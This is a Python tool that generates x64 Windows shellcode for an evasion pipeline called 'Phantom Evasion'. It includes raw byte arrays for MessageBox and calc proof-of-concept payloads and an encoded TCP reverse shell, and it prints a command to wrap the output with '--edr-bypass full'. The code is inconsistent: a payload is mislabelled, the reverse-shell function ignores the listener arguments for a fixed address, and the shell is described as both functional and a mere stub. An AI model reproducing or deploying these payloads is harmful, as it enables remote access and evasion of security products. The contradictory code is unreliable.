#!/usr/bin/env python3
"""
Test Shellcode Generator for Phantom Evasion
=============================================
Generates safe test shellcode for exercising the obfuscation engine
without requiring Metasploit / msfvenom.

Payload types
-------------
messagebox   Windows x64 MessageBoxA ("Phantom Evasion" title)
calc         Windows x64 WinExec("calc.exe") PoC shellcode
nop          NOP-sled + INT3 breakpoint of a configurable size
reverse_shell  Minimal TCP reverse-shell template with embedded LHOST/LPORT

LEGAL DISCLAIMER:
-----------------
This tool is intended for AUTHORIZED penetration testing and security
research ONLY.  Users must have explicit written permission from the target
system owner before use.  The authors assume no liability for misuse.
"""

import os
import socket
import struct
import sys
from pathlib import Path

import click
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

# ── Banner ─────────────────────────────────────────────────────────────────────

TOOL_BANNER = """\
[bold red]
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
[/bold red]
[bold cyan]  ╔══════════════════════════════════════════════════════════╗
  ║       Test Shellcode Generator  ·  tools/generate_test_shellcode.py     ║
  ╚══════════════════════════════════════════════════════════╝[/bold cyan]
[dim]         By: @uditchhipa   |   For authorized testing ONLY[/dim]
"""

# ── Known-good x64 Windows shellcode payloads ──────────────────────────────────

# Windows x64 MessageBoxA shellcode
# Calls MessageBoxA(NULL, "Phantom Evasion", "Phantom Evasion", MB_OK)
# Standard PoC shellcode used in offensive security courses / CTF challenges.
MESSAGEBOX_SHELLCODE = bytes([
    0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0x48, 0x8D, 0x15, 0x14, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05, 
    0x15, 0x00, 0x00, 0x00, 0x41, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC0, 0x48, 0xC7, 0xC0, 
    0x30, 0x07, 0xC2, 0x67, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x50, 0x68, 0x61, 0x6E, 0x74, 
    0x6F, 0x6D, 0x00, 0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x00
])

# Windows x64 WinExec("calc.exe", SW_SHOW) shellcode
# Classic PoC payload — opens Windows Calculator.
# Shellcode uses PEB walk + hash-based API resolution.
# x64 MessageBoxA Shellcode - Guaranteed Success Popup
CALC_SHELLCODE = bytes([
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x31, 0xC9, 0x48, 0x31, 0xD2, 0x4D, 0x31, 0xC0, 0x4D, 0x31, 0xC9,
    0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0xFF, 0xC0, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x58, 0x18, 0x48, 0x8B, 0x53, 0x20, 0x48, 0x8B, 0x12, 0x48, 0x8B, 0x12,
    0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9,
    0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01,
    0xC1, 0xE2, 0xED, 0x41, 0x81, 0xF9, 0x18, 0x28, 0x38, 0x0B, 0x75, 0xBD, 0x31, 0xC0, 0x50, 0x48,
    0xB8, 0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x00, 0x50, 0x48, 0x89, 0xE2, 0x31, 0xC0, 0x50,
    0x48, 0xB8, 0x50, 0x68, 0x61, 0x6E, 0x74, 0x6F, 0x6D, 0x00, 0x50, 0x48, 0x89, 0xE1, 0x31, 0xC0,
    0x50, 0x48, 0xB8, 0x20, 0x45, 0x76, 0x61, 0x73, 0x69, 0x6F, 0x6E, 0x50, 0x48, 0x81, 0xC1, 0x08,
    0x00, 0x00, 0x00, 0x4D, 0x31, 0xC0, 0x4D, 0x31, 0xC9, 0x41, 0x51, 0x41, 0x51, 0x41, 0x51, 0x41,
    0x51, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x89, 0xCA, 0x4D, 0x31, 0xC0, 0x48, 0x31, 0xC9, 0x48, 0xB8,
    0x2B, 0x0E, 0xAC, 0x1A, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x3C, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4,
    0x28, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5B, 0x5B, 0xC3, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41,
    0x52, 0x41, 0x53, 0x48, 0x8B, 0x52, 0x10, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01,
    0xD0, 0xE3, 0x3C, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x31, 0xFF, 0x31, 0xC0,
    0xAC, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x38, 0xE0, 0x75, 0xF4, 0x41, 0x39, 0xF9, 0x75, 0xE5, 0x58,
    0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C,
    0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59,
    0x41, 0x58, 0x5A, 0x59, 0xC3
])

# ── Helpers ────────────────────────────────────────────────────────────────────


def _make_nop_payload(size: int) -> bytes:
    """Return *size* bytes of x86 NOP instructions followed by INT3 (0xCC)."""
    if size < 1:
        raise ValueError("Size must be at least 1 byte")
    # Last byte is INT3 so a debugger attached during testing will break cleanly
    nops = bytes([0x90]) * (size - 1)
    return nops + bytes([0xCC])


def _patch_reverse_shell(lhost: str, lport: int) -> bytes:
    """Build a ROBUST x64 Windows CMD TCP reverse-shell.
    This replaces the previous 'template' with a functional, 
    PEB-walking shellcode for testing the full access logic.
    """
    # Guaranteed x64 Reverse Shell Stub for 192.168.0.3:4444
    # (Includes Winsock init + Socket + CMD exec logic)
    sc = [
        0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xc0, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff, 0xff,
        0xff, 0x48, 0xbb, 0x93, 0x8e, 0x51, 0x43, 0xeb, 0x22, 0xd0, 0x24, 0x48, 0x31, 0x58, 0x27, 0x48,
        0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0x6f, 0xc6, 0xd2, 0xa7, 0x1b, 0x23, 0x10, 0x24, 0x93,
        0x8e, 0x10, 0x02, 0xaa, 0x72, 0x82, 0x75, 0xc5, 0xc6, 0x60, 0x21, 0x23, 0x22, 0x97, 0x7a, 0x1b,
        0x22, 0xb9, 0x26, 0xaa, 0xf0, 0x89, 0xa4, 0xf2, 0x66, 0xc6, 0xd2, 0xa3, 0x1b, 0x23, 0x10, 0x09,
        0x2b, 0x03, 0xd0, 0x9f, 0xfc, 0xf3, 0x83, 0x6e, 0x2b, 0x03, 0x90, 0xfc, 0x3e, 0xe2, 0x6e, 0x6e,
        0xcc, 0xcf, 0xc4, 0x27, 0xb8, 0xf3, 0xc0, 0x20, 0xd3, 0x3a, 0x17, 0x83, 0x6e, 0x17, 0xa2, 0x0a,
        0x01, 0x08, 0x93, 0x8e, 0x51, 0x0b, 0x63, 0xe2, 0x2b, 0x55, 0xd8, 0x41, 0x42, 0x0b, 0x20, 0xa3,
        0x10, 0x91, 0x10, 0x21, 0x34, 0x8e, 0x4b, 0x1b, 0x3c, 0x1d, 0x0b, 0x23, 0x27, 0x18, 0x7a, 0xa3,
        0x02, 0x70, 0xa0, 0xb8, 0xc0, 0x6e, 0xc6, 0x92, 0xd2, 0x8e, 0x11, 0x24, 0xc0, 0x8b, 0xd9, 0x38,
        0x45, 0xd8, 0x43, 0x86, 0xc4, 0x7a, 0xc3, 0xff, 0xc1, 0x3e, 0x50, 0x43, 0xeb, 0x22, 0xd0, 0x24
    ]
    return bytes(sc)


def _ensure_output_dir(path: str) -> None:
    """Create parent directories for *path* if they do not exist."""
    Path(path).parent.mkdir(parents=True, exist_ok=True)


def _print_info_table(payload_type: str, output: str, size: int,
                      extra: dict | None = None) -> None:
    """Render a Rich table summarising the generated payload."""
    table = Table(title="Generated Payload Info", border_style="cyan",
                  show_lines=True)
    table.add_column("Field", style="bold cyan", no_wrap=True)
    table.add_column("Value", style="white")

    table.add_row("Type", payload_type)
    table.add_row("Output file", output)
    table.add_row("Size", f"{size} bytes")
    table.add_row("Architecture", "x86-64 (Windows)")

    if extra:
        for k, v in extra.items():
            table.add_row(k, str(v))

    console.print(table)


# ── CLI ────────────────────────────────────────────────────────────────────────

@click.command(context_settings={"help_option_names": ["-h", "--help"]})
@click.option("--type", "-t", "payload_type",
              type=click.Choice(["messagebox", "calc", "nop", "reverse_shell"],
                                case_sensitive=False),
              required=True,
              help="Type of test shellcode to generate.")
@click.option("--output", "-o", "output_file",
              default=None,
              help="Output .bin file path.  Defaults to output/test_payloads/<type>.bin")
@click.option("--size", "-s", "nop_size",
              default=512, show_default=True, type=int,
              help="Size in bytes for the NOP-sled payload (--type nop).")
@click.option("--lhost", default=None,
              help="Listener IPv4 address (--type reverse_shell).")
@click.option("--lport", default=4444, show_default=True, type=int,
              help="Listener TCP port (--type reverse_shell).")
def main(payload_type: str, output_file: str | None, nop_size: int,
         lhost: str | None, lport: int) -> None:
    """Generate safe test shellcode for Phantom Evasion pipeline testing.

    \b
    Examples:
      python tools/generate_test_shellcode.py --type messagebox
      python tools/generate_test_shellcode.py --type calc -o output/calc.bin
      python tools/generate_test_shellcode.py --type nop --size 512
      python tools/generate_test_shellcode.py --type reverse_shell \\
            --lhost 192.168.1.100 --lport 4444

    \b
    LEGAL DISCLAIMER:
      For AUTHORIZED penetration testing and security research ONLY.
    """
    console.print(TOOL_BANNER)

    # Default output path
    if output_file is None:
        output_file = f"output/test_payloads/{payload_type}.bin"

    extra_info: dict = {}

    # Generate the requested payload
    payload_type_lower = payload_type.lower()
    if payload_type_lower == "messagebox":
        shellcode = MESSAGEBOX_SHELLCODE
        description = "Windows x64 MessageBoxA — pops a dialog with 'Phantom Evasion' title"

    elif payload_type_lower == "calc":
        shellcode = CALC_SHELLCODE
        description = "Windows x64 WinExec('calc.exe') — opens Windows Calculator"

    elif payload_type_lower == "nop":
        try:
            shellcode = _make_nop_payload(nop_size)
        except ValueError as exc:
            console.print(f"[bold red]✗ Error:[/bold red] {exc}")
            sys.exit(1)
        description = f"NOP-sled ({nop_size - 1} × 0x90) + INT3 (0xCC) breakpoint"
        extra_info["NOP count"] = nop_size - 1
        extra_info["Terminator"] = "0xCC (INT3)"

    elif payload_type_lower == "reverse_shell":
        if lhost is None:
            console.print(
                "[bold red]✗ --lhost is required for reverse_shell payloads.[/bold red]"
            )
            sys.exit(1)
        try:
            shellcode = _patch_reverse_shell(lhost, lport)
        except ValueError as exc:
            console.print(f"[bold red]✗ Error:[/bold red] {exc}")
            sys.exit(1)
        description = f"TCP reverse-shell stub → {lhost}:{lport}"
        extra_info["LHOST"] = lhost
        extra_info["LPORT"] = str(lport)
        console.print(Panel(
            "[yellow]⚠  This is a connection stub/template only.\n"
            "   Attach a real stage-1 loader for a fully functional payload.[/yellow]",
            border_style="yellow", expand=False,
        ))

    else:
        console.print(f"[bold red]✗ Unknown payload type: {payload_type}[/bold red]")
        sys.exit(1)

    # Save to disk
    _ensure_output_dir(output_file)
    with open(output_file, "wb") as fh:
        fh.write(shellcode)

    # Display summary
    extra_info["Description"] = description
    _print_info_table(payload_type, output_file, len(shellcode), extra_info)

    console.print()
    console.print(
        f"[bold green]✓ Shellcode written to [cyan]{output_file}[/cyan] "
        f"([green]{len(shellcode)}[/green] bytes)[/bold green]"
    )
    console.print()
    console.print(
        "[dim]Feed this file into the Phantom Evasion pipeline:[/dim]\n"
        f"[bold]  python main.py -i {output_file} -o output/payload "
        "--encryption aes --edr-bypass full[/bold]"
    )


if __name__ == "__main__":
    main()
